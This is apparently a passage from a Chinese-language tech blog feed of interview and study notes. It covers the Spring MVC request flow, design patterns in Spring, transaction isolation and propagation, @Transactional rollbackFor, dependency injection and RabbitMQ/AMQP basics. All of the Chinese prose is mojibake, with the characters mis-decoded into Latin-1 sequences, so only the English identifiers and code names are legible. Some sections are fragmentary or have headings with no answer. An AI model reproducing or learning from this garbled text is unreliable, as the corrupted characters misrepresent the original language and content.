<p>Model2 æ¨¡å¼ä¸‹è¿˜å­˜åœ¨å¾ˆå¤šé—®é¢˜ï¼ŒModel2çš„æŠ½è±¡å’Œå°è£…ç¨‹åº¦è¿˜è¿œè¿œä¸å¤Ÿï¼Œä½¿ç”¨Model2è¿›è¡Œå¼€å‘æ—¶ä¸å¯é¿å…åœ°ä¼šé‡å¤é€ è½®å­ï¼Œè¿™å°±å¤§å¤§é™ä½äº†ç¨‹åºçš„å¯ç»´æŠ¤æ€§å’Œå¤ç”¨æ€§ã€‚äºæ˜¯å¾ˆå¤šJavaWebå¼€å‘ç›¸å…³çš„ MVC æ¡†æ¶åº”è¿è€Œç”Ÿæ¯”å¦‚Struts2ï¼Œä½†æ˜¯ Struts2 æ¯”è¾ƒç¬¨é‡ã€‚éšç€ Spring è½»é‡çº§å¼€å‘æ¡†æ¶çš„æµè¡Œï¼ŒSpring ç”Ÿæ€åœˆå‡ºç°äº† Spring MVC æ¡†æ¶ï¼Œ Spring MVC æ˜¯å½“å‰æœ€ä¼˜ç§€çš„ MVC æ¡†æ¶ã€‚ç›¸æ¯”äº Struts2 ï¼Œ Spring MVC ä½¿ç”¨æ›´åŠ ç®€å•å’Œæ–¹ä¾¿ï¼Œå¼€å‘æ•ˆç‡æ›´é«˜ï¼Œå¹¶ä¸” Spring MVC è¿è¡Œé€Ÿåº¦æ›´å¿«ã€‚</p>
<p>MVC æ˜¯ä¸€ç§è®¾è®¡æ¨¡å¼,Spring MVC æ˜¯ä¸€æ¬¾å¾ˆä¼˜ç§€çš„ MVC æ¡†æ¶ã€‚Spring MVC å¯ä»¥å¸®åŠ©æˆ‘ä»¬è¿›è¡Œæ›´ç®€æ´çš„Webå±‚çš„å¼€å‘ï¼Œå¹¶ä¸”å®ƒå¤©ç”Ÿä¸ Spring æ¡†æ¶é›†æˆã€‚Spring MVC ä¸‹æˆ‘ä»¬ä¸€èˆ¬æŠŠåç«¯é¡¹ç›®åˆ†ä¸º Serviceå±‚ï¼ˆå¤„ç†ä¸šåŠ¡ï¼‰ã€Daoå±‚ï¼ˆæ•°æ®åº“æ“ä½œï¼‰ã€Entityå±‚ï¼ˆå®ä½“ç±»ï¼‰ã€Controllerå±‚(æ§åˆ¶å±‚ï¼Œè¿”å›æ•°æ®ç»™å‰å°é¡µé¢)ã€‚</p>
<p><strong>Spring MVC çš„ç®€å•åŸç†å›¾å¦‚ä¸‹ï¼š</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142191.jpg" alt="img"></p>
<h3 id="SpringMVC-å·¥ä½œåŸç†äº†è§£å—"><a href="#SpringMVC-å·¥ä½œåŸç†äº†è§£å—" class="headerlink" title="SpringMVC å·¥ä½œåŸç†äº†è§£å—?"></a>SpringMVC å·¥ä½œåŸç†äº†è§£å—?</h3><p><strong>åŸç†å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</strong> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142192.jpg" alt="SpringMVCè¿è¡ŒåŸç†"></p>
<p>ä¸Šå›¾çš„ä¸€ä¸ªç¬”è¯¯çš„å°é—®é¢˜ï¼šSpring MVC çš„å…¥å£å‡½æ•°ä¹Ÿå°±æ˜¯å‰ç«¯æ§åˆ¶å™¨ <code>DispatcherServlet</code>çš„ä½œç”¨æ˜¯æ¥æ”¶è¯·æ±‚ï¼Œå“åº”ç»“æœã€‚</p>
<p><strong>æµç¨‹è¯´æ˜ï¼ˆé‡è¦ï¼‰ï¼š</strong></p>
<ol>
<li>å®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ï¼‰å‘é€è¯·æ±‚ï¼Œç›´æ¥è¯·æ±‚åˆ° <code>DispatcherServlet</code>ã€‚</li>
<li><code>DispatcherServlet</code> æ ¹æ®è¯·æ±‚ä¿¡æ¯è°ƒç”¨ <code>HandlerMapping</code>ï¼Œè§£æè¯·æ±‚å¯¹åº”çš„ <code>Handler</code>ã€‚</li>
<li>è§£æåˆ°å¯¹åº”çš„ <code>Handler</code>ï¼ˆä¹Ÿå°±æ˜¯æˆ‘ä»¬å¹³å¸¸è¯´çš„ <code>Controller</code> æ§åˆ¶å™¨ï¼‰åï¼Œå¼€å§‹ç”± <code>HandlerAdapter</code> é€‚é…å™¨å¤„ç†ã€‚</li>
<li><code>HandlerAdapter</code> ä¼šæ ¹æ® <code>Handler </code>æ¥è°ƒç”¨çœŸæ­£çš„å¤„ç†å™¨æ¥å¤„ç†è¯·æ±‚ï¼Œå¹¶å¤„ç†ç›¸åº”çš„ä¸šåŠ¡é€»è¾‘ã€‚</li>
<li>å¤„ç†å™¨å¤„ç†å®Œä¸šåŠ¡åï¼Œä¼šè¿”å›ä¸€ä¸ª <code>ModelAndView</code> å¯¹è±¡ï¼Œ<code>Model</code> æ˜¯è¿”å›çš„æ•°æ®å¯¹è±¡ï¼Œ<code>View</code> æ˜¯ä¸ªé€»è¾‘ä¸Šçš„ <code>View</code>ã€‚</li>
<li><code>ViewResolver</code> ä¼šæ ¹æ®é€»è¾‘ <code>View</code> æŸ¥æ‰¾å®é™…çš„ <code>View</code>ã€‚</li>
<li><code>DispaterServlet</code> æŠŠè¿”å›çš„ <code>Model</code> ä¼ ç»™ <code>View</code>ï¼ˆè§†å›¾æ¸²æŸ“ï¼‰ã€‚</li>
<li>æŠŠ <code>View</code> è¿”å›ç»™è¯·æ±‚è€…ï¼ˆæµè§ˆå™¨ï¼‰</li>
</ol>
<h2 id="Spring-æ¡†æ¶ä¸­ç”¨åˆ°äº†å“ªäº›è®¾è®¡æ¨¡å¼ï¼Ÿ"><a href="#Spring-æ¡†æ¶ä¸­ç”¨åˆ°äº†å“ªäº›è®¾è®¡æ¨¡å¼ï¼Ÿ" class="headerlink" title="Spring æ¡†æ¶ä¸­ç”¨åˆ°äº†å“ªäº›è®¾è®¡æ¨¡å¼ï¼Ÿ"></a>Spring æ¡†æ¶ä¸­ç”¨åˆ°äº†å“ªäº›è®¾è®¡æ¨¡å¼ï¼Ÿ</h2><p>å…³äºä¸‹é¢ä¸€äº›è®¾è®¡æ¨¡å¼çš„è¯¦ç»†ä»‹ç»ï¼Œå¯ä»¥çœ‹ç¬”ä¸»å‰æ®µæ—¶é—´çš„åŸåˆ›æ–‡ç« <a href="https://mp.weixin.qq.com/s?__biz=Mzg2OTA0Njk0OA==&mid=2247485303&idx=1&sn=9e4626a1e3f001f9b0d84a6fa0cff04a&chksm=cea248bcf9d5c1aaf48b67cc52bac74eb29d6037848d6cf213b0e5466f2d1fda970db700ba41&token=255050878&lang=zh_CN#rd">ã€Šé¢è¯•å®˜:â€œè°ˆè°ˆSpringä¸­éƒ½ç”¨åˆ°äº†é‚£äº›è®¾è®¡æ¨¡å¼?â€ã€‚ã€‹</a> ã€‚</p>
<ul>
<li><strong>å·¥å‚è®¾è®¡æ¨¡å¼</strong> : Springä½¿ç”¨å·¥å‚æ¨¡å¼é€šè¿‡ <code>BeanFactory</code>ã€<code>ApplicationContext</code> åˆ›å»º bean å¯¹è±¡ã€‚</li>
<li><strong>ä»£ç†è®¾è®¡æ¨¡å¼</strong> : Spring AOP åŠŸèƒ½çš„å®ç°ã€‚</li>
<li><strong>å•ä¾‹è®¾è®¡æ¨¡å¼</strong> : Spring ä¸­çš„ Bean é»˜è®¤éƒ½æ˜¯å•ä¾‹çš„ã€‚</li>
<li><strong>æ¨¡æ¿æ–¹æ³•æ¨¡å¼</strong> : Spring ä¸­ <code>jdbcTemplate</code>ã€<code>hibernateTemplate</code> ç­‰ä»¥ Template ç»“å°¾çš„å¯¹æ•°æ®åº“æ“ä½œçš„ç±»ï¼Œå®ƒä»¬å°±ä½¿ç”¨åˆ°äº†æ¨¡æ¿æ¨¡å¼ã€‚</li>
<li><strong>åŒ…è£…å™¨è®¾è®¡æ¨¡å¼</strong> : æˆ‘ä»¬çš„é¡¹ç›®éœ€è¦è¿æ¥å¤šä¸ªæ•°æ®åº“ï¼Œè€Œä¸”ä¸åŒçš„å®¢æˆ·åœ¨æ¯æ¬¡è®¿é—®ä¸­æ ¹æ®éœ€è¦ä¼šå»è®¿é—®ä¸åŒçš„æ•°æ®åº“ã€‚è¿™ç§æ¨¡å¼è®©æˆ‘ä»¬å¯ä»¥æ ¹æ®å®¢æˆ·çš„éœ€æ±‚èƒ½å¤ŸåŠ¨æ€åˆ‡æ¢ä¸åŒçš„æ•°æ®æºã€‚</li>
<li><strong>è§‚å¯Ÿè€…æ¨¡å¼:</strong> Spring äº‹ä»¶é©±åŠ¨æ¨¡å‹å°±æ˜¯è§‚å¯Ÿè€…æ¨¡å¼å¾ˆç»å…¸çš„ä¸€ä¸ªåº”ç”¨ã€‚</li>
<li><strong>é€‚é…å™¨æ¨¡å¼</strong> :Spring AOP çš„å¢å¼ºæˆ–é€šçŸ¥(Advice)ä½¿ç”¨åˆ°äº†é€‚é…å™¨æ¨¡å¼ã€spring MVC ä¸­ä¹Ÿæ˜¯ç”¨åˆ°äº†é€‚é…å™¨æ¨¡å¼é€‚é…<code>Controller</code>ã€‚</li>
<li>â€¦â€¦</li>
</ul>
<h2 id="Spring-äº‹åŠ¡"><a href="#Spring-äº‹åŠ¡" class="headerlink" title="Spring äº‹åŠ¡"></a>Spring äº‹åŠ¡</h2><h3 id="Spring-ç®¡ç†äº‹åŠ¡çš„æ–¹å¼æœ‰å‡ ç§ï¼Ÿ"><a href="#Spring-ç®¡ç†äº‹åŠ¡çš„æ–¹å¼æœ‰å‡ ç§ï¼Ÿ" class="headerlink" title="Spring ç®¡ç†äº‹åŠ¡çš„æ–¹å¼æœ‰å‡ ç§ï¼Ÿ"></a>Spring ç®¡ç†äº‹åŠ¡çš„æ–¹å¼æœ‰å‡ ç§ï¼Ÿ</h3><ol>
<li>ç¼–ç¨‹å¼äº‹åŠ¡ï¼Œåœ¨ä»£ç ä¸­ç¡¬ç¼–ç ã€‚(ä¸æ¨èä½¿ç”¨)</li>
<li>å£°æ˜å¼äº‹åŠ¡ï¼Œåœ¨é…ç½®æ–‡ä»¶ä¸­é…ç½®ï¼ˆæ¨èä½¿ç”¨ï¼‰</li>
</ol>
<p><strong>å£°æ˜å¼äº‹åŠ¡åˆåˆ†ä¸ºä¸¤ç§ï¼š</strong></p>
<ol>
<li>åŸºäºXMLçš„å£°æ˜å¼äº‹åŠ¡</li>
<li>åŸºäºæ³¨è§£çš„å£°æ˜å¼äº‹åŠ¡</li>
</ol>
<h3 id="Spring-äº‹åŠ¡ä¸­çš„éš”ç¦»çº§åˆ«æœ‰å“ªå‡ ç§"><a href="#Spring-äº‹åŠ¡ä¸­çš„éš”ç¦»çº§åˆ«æœ‰å“ªå‡ ç§" class="headerlink" title="Spring äº‹åŠ¡ä¸­çš„éš”ç¦»çº§åˆ«æœ‰å“ªå‡ ç§?"></a>Spring äº‹åŠ¡ä¸­çš„éš”ç¦»çº§åˆ«æœ‰å“ªå‡ ç§?</h3><p><strong>TransactionDefinition æ¥å£ä¸­å®šä¹‰äº†äº”ä¸ªè¡¨ç¤ºéš”ç¦»çº§åˆ«çš„å¸¸é‡ï¼š</strong></p>
<ul>
<li><strong>TransactionDefinition.ISOLATION_DEFAULT:</strong> ä½¿ç”¨åç«¯æ•°æ®åº“é»˜è®¤çš„éš”ç¦»çº§åˆ«ï¼ŒMysql é»˜è®¤é‡‡ç”¨çš„ REPEATABLE_READéš”ç¦»çº§åˆ« Oracle é»˜è®¤é‡‡ç”¨çš„ READ_COMMITTEDéš”ç¦»çº§åˆ«.</li>
<li><strong>TransactionDefinition.ISOLATION_READ_UNCOMMITTED:</strong> æœ€ä½çš„éš”ç¦»çº§åˆ«ï¼Œå…è®¸è¯»å–å°šæœªæäº¤çš„æ•°æ®å˜æ›´ï¼Œ<strong>å¯èƒ½ä¼šå¯¼è‡´è„è¯»ã€å¹»è¯»æˆ–ä¸å¯é‡å¤è¯»</strong></li>
<li><strong>TransactionDefinition.ISOLATION_READ_COMMITTED:</strong> å…è®¸è¯»å–å¹¶å‘äº‹åŠ¡å·²ç»æäº¤çš„æ•°æ®ï¼Œ<strong>å¯ä»¥é˜»æ­¢è„è¯»ï¼Œä½†æ˜¯å¹»è¯»æˆ–ä¸å¯é‡å¤è¯»ä»æœ‰å¯èƒ½å‘ç”Ÿ</strong></li>
<li><strong>TransactionDefinition.ISOLATION_REPEATABLE_READ:</strong> å¯¹åŒä¸€å­—æ®µçš„å¤šæ¬¡è¯»å–ç»“æœéƒ½æ˜¯ä¸€è‡´çš„ï¼Œé™¤éæ•°æ®æ˜¯è¢«æœ¬èº«äº‹åŠ¡è‡ªå·±æ‰€ä¿®æ”¹ï¼Œ<strong>å¯ä»¥é˜»æ­¢è„è¯»å’Œä¸å¯é‡å¤è¯»ï¼Œä½†å¹»è¯»ä»æœ‰å¯èƒ½å‘ç”Ÿã€‚</strong></li>
<li><strong>TransactionDefinition.ISOLATION_SERIALIZABLE:</strong> æœ€é«˜çš„éš”ç¦»çº§åˆ«ï¼Œå®Œå…¨æœä»ACIDçš„éš”ç¦»çº§åˆ«ã€‚æ‰€æœ‰çš„äº‹åŠ¡ä¾æ¬¡é€ä¸ªæ‰§è¡Œï¼Œè¿™æ ·äº‹åŠ¡ä¹‹é—´å°±å®Œå…¨ä¸å¯èƒ½äº§ç”Ÿå¹²æ‰°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>è¯¥çº§åˆ«å¯ä»¥é˜²æ­¢è„è¯»ã€ä¸å¯é‡å¤è¯»ä»¥åŠå¹»è¯»</strong>ã€‚ä½†æ˜¯è¿™å°†ä¸¥é‡å½±å“ç¨‹åºçš„æ€§èƒ½ã€‚é€šå¸¸æƒ…å†µä¸‹ä¹Ÿä¸ä¼šç”¨åˆ°è¯¥çº§åˆ«ã€‚</li>
</ul>
<h3 id="Spring-äº‹åŠ¡ä¸­å“ªå‡ ç§äº‹åŠ¡ä¼ æ’­è¡Œä¸º"><a href="#Spring-äº‹åŠ¡ä¸­å“ªå‡ ç§äº‹åŠ¡ä¼ æ’­è¡Œä¸º" class="headerlink" title="Spring äº‹åŠ¡ä¸­å“ªå‡ ç§äº‹åŠ¡ä¼ æ’­è¡Œä¸º?"></a>Spring äº‹åŠ¡ä¸­å“ªå‡ ç§äº‹åŠ¡ä¼ æ’­è¡Œä¸º?</h3><p><strong>æ”¯æŒå½“å‰äº‹åŠ¡çš„æƒ…å†µï¼š</strong></p>
<ul>
<li><strong>TransactionDefinition.PROPAGATION_REQUIREDï¼š</strong> å¦‚æœå½“å‰å­˜åœ¨äº‹åŠ¡ï¼Œåˆ™åŠ å…¥è¯¥äº‹åŠ¡ï¼›å¦‚æœå½“å‰æ²¡æœ‰äº‹åŠ¡ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªæ–°çš„äº‹åŠ¡ã€‚</li>
<li><strong>TransactionDefinition.PROPAGATION_SUPPORTSï¼š</strong> å¦‚æœå½“å‰å­˜åœ¨äº‹åŠ¡ï¼Œåˆ™åŠ å…¥è¯¥äº‹åŠ¡ï¼›å¦‚æœå½“å‰æ²¡æœ‰äº‹åŠ¡ï¼Œåˆ™ä»¥éäº‹åŠ¡çš„æ–¹å¼ç»§ç»­è¿è¡Œã€‚</li>
<li><strong>TransactionDefinition.PROPAGATION_MANDATORYï¼š</strong> å¦‚æœå½“å‰å­˜åœ¨äº‹åŠ¡ï¼Œåˆ™åŠ å…¥è¯¥äº‹åŠ¡ï¼›å¦‚æœå½“å‰æ²¡æœ‰äº‹åŠ¡ï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸ã€‚ï¼ˆmandatoryï¼šå¼ºåˆ¶æ€§ï¼‰</li>
</ul>
<p><strong>ä¸æ”¯æŒå½“å‰äº‹åŠ¡çš„æƒ…å†µï¼š</strong></p>
<ul>
<li><strong>TransactionDefinition.PROPAGATION_REQUIRES_NEWï¼š</strong> åˆ›å»ºä¸€ä¸ªæ–°çš„äº‹åŠ¡ï¼Œå¦‚æœå½“å‰å­˜åœ¨äº‹åŠ¡ï¼Œåˆ™æŠŠå½“å‰äº‹åŠ¡æŒ‚èµ·ã€‚</li>
<li><strong>TransactionDefinition.PROPAGATION_NOT_SUPPORTEDï¼š</strong> ä»¥éäº‹åŠ¡æ–¹å¼è¿è¡Œï¼Œå¦‚æœå½“å‰å­˜åœ¨äº‹åŠ¡ï¼Œåˆ™æŠŠå½“å‰äº‹åŠ¡æŒ‚èµ·ã€‚</li>
<li><strong>TransactionDefinition.PROPAGATION_NEVERï¼š</strong> ä»¥éäº‹åŠ¡æ–¹å¼è¿è¡Œï¼Œå¦‚æœå½“å‰å­˜åœ¨äº‹åŠ¡ï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸ã€‚</li>
</ul>
<p><strong>å…¶ä»–æƒ…å†µï¼š</strong></p>
<ul>
<li><strong>TransactionDefinition.PROPAGATION_NESTEDï¼š</strong> å¦‚æœå½“å‰å­˜åœ¨äº‹åŠ¡ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªäº‹åŠ¡ä½œä¸ºå½“å‰äº‹åŠ¡çš„åµŒå¥—äº‹åŠ¡æ¥è¿è¡Œï¼›å¦‚æœå½“å‰æ²¡æœ‰äº‹åŠ¡ï¼Œåˆ™è¯¥å–å€¼ç­‰ä»·äºTransactionDefinition.PROPAGATION_REQUIREDã€‚</li>
</ul>
<h3 id="Transactional-rollbackFor-x3D-Exception-class-æ³¨è§£äº†è§£å—ï¼Ÿ"><a href="#Transactional-rollbackFor-x3D-Exception-class-æ³¨è§£äº†è§£å—ï¼Ÿ" class="headerlink" title="@Transactional(rollbackFor &#x3D; Exception.class)æ³¨è§£äº†è§£å—ï¼Ÿ"></a>@Transactional(rollbackFor &#x3D; Exception.class)æ³¨è§£äº†è§£å—ï¼Ÿ</h3><p>æˆ‘ä»¬çŸ¥é“ï¼šExceptionåˆ†ä¸ºè¿è¡Œæ—¶å¼‚å¸¸RuntimeExceptionå’Œéè¿è¡Œæ—¶å¼‚å¸¸ã€‚äº‹åŠ¡ç®¡ç†å¯¹äºä¼ä¸šåº”ç”¨æ¥è¯´æ˜¯è‡³å…³é‡è¦çš„ï¼Œå³ä½¿å‡ºç°å¼‚å¸¸æƒ…å†µï¼Œå®ƒä¹Ÿå¯ä»¥ä¿è¯æ•°æ®çš„ä¸€è‡´æ€§ã€‚</p>
<p>å½“<code>@Transactional</code>æ³¨è§£ä½œç”¨äºç±»ä¸Šæ—¶ï¼Œè¯¥ç±»çš„æ‰€æœ‰ public æ–¹æ³•å°†éƒ½å…·æœ‰è¯¥ç±»å‹çš„äº‹åŠ¡å±æ€§ï¼ŒåŒæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨æ–¹æ³•çº§åˆ«ä½¿ç”¨è¯¥æ ‡æ³¨æ¥è¦†ç›–ç±»çº§åˆ«çš„å®šä¹‰ã€‚å¦‚æœç±»æˆ–è€…æ–¹æ³•åŠ äº†è¿™ä¸ªæ³¨è§£ï¼Œé‚£ä¹ˆè¿™ä¸ªç±»é‡Œé¢çš„æ–¹æ³•æŠ›å‡ºå¼‚å¸¸ï¼Œå°±ä¼šå›æ»šï¼Œæ•°æ®åº“é‡Œé¢çš„æ•°æ®ä¹Ÿä¼šå›æ»šã€‚</p>
<p>åœ¨<code>@Transactional</code>æ³¨è§£ä¸­å¦‚æœä¸é…ç½®<code>rollbackFor</code>å±æ€§,é‚£ä¹ˆäº‹åŠ¡åªä¼šåœ¨é‡åˆ°<code>RuntimeException</code>çš„æ—¶å€™æ‰ä¼šå›æ»š,åŠ ä¸Š<code>rollbackFor=Exception.class</code>,å¯ä»¥è®©äº‹åŠ¡åœ¨é‡åˆ°éè¿è¡Œæ—¶å¼‚å¸¸æ—¶ä¹Ÿå›æ»šã€‚</p>
<p>å…³äº <code>@Transactional </code> æ³¨è§£æ¨èé˜…è¯»çš„æ–‡ç« ï¼š</p>
<ul>
<li><a href="https://www.ibm.com/developerworks/cn/java/j-master-spring-transactional-use/index.html">é€å½»çš„æŒæ¡ Spring ä¸­@transactional çš„ä½¿ç”¨</a></li>
</ul>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li>ã€ŠSpring æŠ€æœ¯å†…å¹•ã€‹</li>
<li><a href="http://www.cnblogs.com/wmyskxz/p/8820371.html">http://www.cnblogs.com/wmyskxz/p/8820371.html</a></li>
<li><a href="https://www.journaldev.com/2696/spring-interview-questions-and-answers">https://www.journaldev.com/2696/spring-interview-questions-and-answers</a></li>
<li><a href="https://www.edureka.co/blog/interview-questions/spring-interview-questions/">https://www.edureka.co/blog/interview-questions/spring-interview-questions/</a></li>
<li><a href="https://www.cnblogs.com/clwydjgs/p/9317849.html">https://www.cnblogs.com/clwydjgs/p/9317849.html</a></li>
<li><a href="https://howtodoinjava.com/interview-questions/top-spring-interview-questions-with-answers/">https://howtodoinjava.com/interview-questions/top-spring-interview-questions-with-answers/</a></li>
<li><a href="http://www.tomaszezula.com/2014/02/09/spring-series-part-5-component-vs-bean/">http://www.tomaszezula.com/2014/02/09/spring-series-part-5-component-vs-bean/</a></li>
<li><a href="https://stackoverflow.com/questions/34172888/difference-between-bean-and-autowired">https://stackoverflow.com/questions/34172888/difference-between-bean-and-autowired</a></li>
<li><a href="https://www.interviewbit.com/spring-interview-questions/">https://www.interviewbit.com/spring-interview-questions/</a></li>
</ul>
<h2 id="ä¾èµ–æ³¨å…¥çš„ä¸‰ç§æ–¹å¼"><a href="#ä¾èµ–æ³¨å…¥çš„ä¸‰ç§æ–¹å¼" class="headerlink" title="ä¾èµ–æ³¨å…¥çš„ä¸‰ç§æ–¹å¼"></a>ä¾èµ–æ³¨å…¥çš„ä¸‰ç§æ–¹å¼</h2><h3 id="AutoWired-å¸¸ç”¨"><a href="#AutoWired-å¸¸ç”¨" class="headerlink" title="AutoWired(å¸¸ç”¨)"></a>AutoWired(å¸¸ç”¨)</h3><p>ç”¨ä¸‰çº§ç¼“å­˜è§£å†³å¾ªç¯ä¾èµ–, Aä¾èµ–B, Bä¾èµ–A,  è°ƒç”¨Açš„æ— å‚æ„é€ , ç„¶åéƒ½èµ‹äº†åˆå€¼, ç„¶åè°ƒç”¨Bçš„æ— å‚æ„é€ , ç„¶åå°†Aæ³¨å…¥, åªæ˜¯å†å°†Bæ³¨å…¥A</p>
<h3 id="æ„é€ æ–¹æ³•"><a href="#æ„é€ æ–¹æ³•" class="headerlink" title="æ„é€ æ–¹æ³•"></a>æ„é€ æ–¹æ³•</h3><p>å‚æ•°éœ€è¦çš„å¯¹è±¡, å¦‚æœåœ¨IOCå®¹å™¨æœ‰,å°±è‡ªåŠ¨è·å–åˆ°, ä¼šæœ‰å¾ªç¯ä¾èµ–é—®é¢˜</p>
<h4 id="å¾ªç¯ä¾èµ–"><a href="#å¾ªç¯ä¾èµ–" class="headerlink" title="å¾ªç¯ä¾èµ–"></a>å¾ªç¯ä¾èµ–</h4><p>Aä¾èµ–B, Bä¾èµ–A, ä¸¤ä¸ªæœ‰å‚æ„é€ äº’ç›¸æ­»é”;</p>
<p>å¯åŠ¨æ—¶ä¼šæŠ¥é”™, èƒ½æŒ‡å‡ºå…·ä½“çš„ç±», </p>
<h3 id="æä¾›setæ–¹æ³•"><a href="#æä¾›setæ–¹æ³•" class="headerlink" title="æä¾›setæ–¹æ³•"></a>æä¾›setæ–¹æ³•</h3><h1 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h1><p>è·¯ç”±keyç›¸å½“äºä¸€ä¸ªæ¡ä»¶</p>
<h2 id="ç½‘ç»œåè®®çš„ä¸‰è¦ç´ "><a href="#ç½‘ç»œåè®®çš„ä¸‰è¦ç´ " class="headerlink" title="ç½‘ç»œåè®®çš„ä¸‰è¦ç´ "></a>ç½‘ç»œåè®®çš„ä¸‰è¦ç´ </h2><p>è¯­æ³• : httpè§„å®šäº†è¯·æ±‚æŠ¥æ–‡å’Œå“åº”æŠ¥æ–‡çš„æ ¼å¼; </p>
<p>è¯­ä¹‰: å®¢æˆ·ç«¯ä¸»åŠ¨å‘èµ·çš„è¯·æ±‚ç§°ä¹‹ä¸ºè¯·æ±‚;(è¿™æ˜¯ä¸€ç§è§„å®š)</p>
<p>æ—¶åº: ä¸€ä¸ªè¯·æ±‚å¯¹åº”ä¸€ä¸ªå“åº”(ä¸€ä¸ªå…ˆæœ‰è¯·æ±‚å†æœ‰å“åº”)</p>
<p>å¸¸è§çš„æ¶ˆæ¯ä¸­é—´ä»¶åè®®: OpenWireã€AMQPã€MQTTã€Kafka(ä¸é€‚åˆåˆ†å¸ƒå¼,é€Ÿåº¦å¿«)ã€OpenMessage</p>
<h2 id="AMQP"><a href="#AMQP" class="headerlink" title="AMQP"></a>AMQP</h2><p>Advanced Message Queuing Protocol é«˜çº§æ¶ˆæ¯é˜Ÿåˆ—åè®®;TCP&#x2F;ipåè®®ä¹‹ä¸Š; åˆ†å¸ƒå¼äº‹åŠ¡æ”¯æŒ; æ¶ˆæ¯æŒä¹…åŒ–æ”¯æŒ; é«˜æ€§èƒ½å’Œé«˜å¯é çš„æ¶ˆæ¯å¤„ç†ä¼˜åŠ¿; Erlangå®ç°æœ‰RabbitMQ;</p>
<h2 id="é¢è¯•é¢˜"><a href="#é¢è¯•é¢˜" class="headerlink" title="é¢è¯•é¢˜"></a>é¢è¯•é¢˜</h2><h3 id="ä¸ºä»€ä¹ˆæ¶ˆæ¯ä¸­é—´ä»¶ä¸ç›´æ¥ä½¿ç”¨httpåè®®"><a href="#ä¸ºä»€ä¹ˆæ¶ˆæ¯ä¸­é—´ä»¶ä¸ç›´æ¥ä½¿ç”¨httpåè®®" class="headerlink" title="ä¸ºä»€ä¹ˆæ¶ˆæ¯ä¸­é—´ä»¶ä¸ç›´æ¥ä½¿ç”¨httpåè®®?"></a>ä¸ºä»€ä¹ˆæ¶ˆæ¯ä¸­é—´ä»¶ä¸ç›´æ¥ä½¿ç”¨httpåè®®?</h3><p>1.å› ä¸ºhttpè¯·æ±‚æŠ¥æ–‡å¤´å’Œå“åº”æŠ¥æ–‡å¤´æ˜¯æ¯”è¾ƒå¤æ‚çš„,åŒ…å«äº†cookie,æ•°æ®çš„åŠ å¯†è§£å¯†,çŠ¶æ€ç ,å“åº”ç ç­‰é™„åŠ åŠŸèƒ½,ä½†æ˜¯å¯¹äºä¸€ä¸ªæ¶ˆæ¯è€Œè¨€,æˆ‘ä»¬å¹¶ä¸éœ€è¦è¿™ä¹ˆå¤æ‚,å®ƒå…¶å®å°±æ˜¯è´Ÿè´£æ•°æ®ä¼ é€’ã€å­˜å‚¨ã€åˆ†å‘å°±è¡Œ,ä¸€å®šè¦è¿½æ±‚é«˜æ€§èƒ½. å°½é‡ç®€æ´,å¿«é€Ÿ.</p>
<p>2.å¤§éƒ¨åˆ†æƒ…å†µä¸‹httpå¤§éƒ¨åˆ†éƒ½æ˜¯çŸ­é“¾æ¥,åœ¨å®é™…çš„äº¤äº’è¿‡ç¨‹ä¸­,ä¸€ä¸ªè¯·æ±‚åˆ°å“åº”å¾ˆæœ‰å¯èƒ½ä¼šä¸­æ–­,ä¸­æ–­ä»¥åå°±ä¸ä¼šæŒä¹…åŒ–,å°±ä¼šé€ æˆè¯·æ±‚çš„ä¸¢å¤±. è¿™æ ·å°±ä¸åˆ©äºæ¶ˆæ¯ä¸­é—´ä»¶çš„ä¸šåŠ¡åœºæ™¯,å› ä¸ºæ¶ˆæ¯ä¸­é—´ä»¶å¯èƒ½æ˜¯ä¸€ä¸ªé•¿æœŸçš„è·å–æ¶ˆæ¯çš„è¿‡ç¨‹,å‡ºç°é—®é¢˜å’Œæ•…éšœè¦å¯¹æ•°æ®æˆ–æ¶ˆæ¯å°±è¡ŒæŒä¹…åŒ–ç­‰,ç›®çš„æ˜¯ä¸ºäº†ä¿è¯æ¶ˆæ¯å’Œæ•°æ®çš„é«˜å¯é å’Œç¨³å¥çš„è¿è¡Œ.</p>
<h3 id="RabbitMQä¸ºä»€ä¹ˆæ˜¯åŸºäºchannelå»å¤„ç†è€Œä¸æ˜¯è¿æ¥"><a href="#RabbitMQä¸ºä»€ä¹ˆæ˜¯åŸºäºchannelå»å¤„ç†è€Œä¸æ˜¯è¿æ¥" class="headerlink" title="RabbitMQä¸ºä»€ä¹ˆæ˜¯åŸºäºchannelå»å¤„ç†è€Œä¸æ˜¯è¿æ¥?"></a>RabbitMQä¸ºä»€ä¹ˆæ˜¯åŸºäºchannelå»å¤„ç†è€Œä¸æ˜¯è¿æ¥?</h3><h3 id="å¯ä»¥å­˜åœ¨æ²¡æœ‰äº¤æ¢æœºçš„é˜Ÿåˆ—å—"><a href="#å¯ä»¥å­˜åœ¨æ²¡æœ‰äº¤æ¢æœºçš„é˜Ÿåˆ—å—" class="headerlink" title="å¯ä»¥å­˜åœ¨æ²¡æœ‰äº¤æ¢æœºçš„é˜Ÿåˆ—å—?"></a>å¯ä»¥å­˜åœ¨æ²¡æœ‰äº¤æ¢æœºçš„é˜Ÿåˆ—å—?</h3><p>ä¸å¯ä»¥,å³ä½¿æ²¡æœ‰åˆ¶å®š,éƒ½ä¼šç»‘å®šåˆ°é»˜è®¤çš„äº¤æ¢æœº; </p>
]]></content>
      <categories>
        <category>Leyou</category>
      </categories>
      <tags>
        <tag>Leyou</tag>
      </tags>
  </entry>
  <entry>
    <title>leyoué¡¹ç›®æ­å»º</title>
    <url>/2021/12/21/leyou/Leyou%E7%AC%94%E8%AE%B0/</url>
